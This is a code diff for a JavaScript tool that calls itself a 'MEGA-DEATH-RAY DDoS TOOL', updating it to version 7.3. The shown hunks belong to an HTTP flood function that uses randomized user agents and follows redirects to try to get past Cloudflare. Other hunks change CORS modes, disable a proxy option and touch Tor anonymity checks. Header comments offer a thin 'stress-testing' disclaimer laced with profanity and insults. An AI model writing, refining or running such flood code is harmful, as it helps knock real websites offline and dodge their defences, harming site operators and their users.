@@ -1,4 +1,4 @@
-// MEGA-DEATH-RAY DDoS TOOL - Noodles Inc. (v7.2)
+// MEGA-DEATH-RAY DDoS TOOL - Noodles Inc. (v7.3)
 // WARNING: This tool is designed for **EXTREME** stress-testing only. Unauthorized use is a felony, you fuckin' degenerate.
 // By using this, you agree to sell your soul and firstborn to Noodles Inc. We ain't responsible for your dumbass choices.
 // ALL activities are logged in high-definition, so don't get cute. We're watching you, bitch.
@@ -222,7 +222,7 @@ async function httpFlood(url, hexBytes, proxy) {
         const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 second timeout
 
         const fetchOptions = {
-            mode: 'no-cors', // Bypass CORS like a goddamn ninja.
+            mode: 'cors', // Bypass CORS like a goddamn ninja.
             method: 'GET', // GET request – simple, effective, like a kick to the balls.
             headers: {
                 'User-Agent': randomUserAgent,
@@ -240,7 +240,7 @@ async function httpFlood(url, hexBytes, proxy) {
             },
             redirect: 'follow', // Follow redirects to try and bypass Cloudflare
             signal: controller.signal,
-            proxy: proxy, // Use proxy server if provided
+            //proxy: proxy, // Use proxy server if provided
         };
 
         const response = await fetch(url, fetchOptions);
@@ -340,7 +340,7 @@ secureHeaders.forEach(header => {
 // TOR Compatibility and Enhanced Anonymity
 const torCheckInterval = setInterval(async () => {
     try {
-        const torExitNode = await fetch('https://check.torproject.org/api/ip', { mode: 'no-cors' });
+        const torExitNode = await fetch('https://check.torproject.org/api/ip', { mode: 'cors' });
         const torData = await torExitNode.json();
         if (torData.IsTor === true) {
             logAction('TOR detected: Enhanced anonymity enabled. Proceed with fucking caution.');
@@ -367,7 +367,7 @@ async function onionCheck(url) {
 
 async function isTorRunning() {
     try {
-        const response = await fetch('https://check.torproject.org/api/ip', { mode: 'no-cors' });
+        const response = await fetch('https://check.torproject.org/api/ip', { mode: 'cors' });
         const data = await response.json();
         return data.IsTor === true;
     } catch (error) {
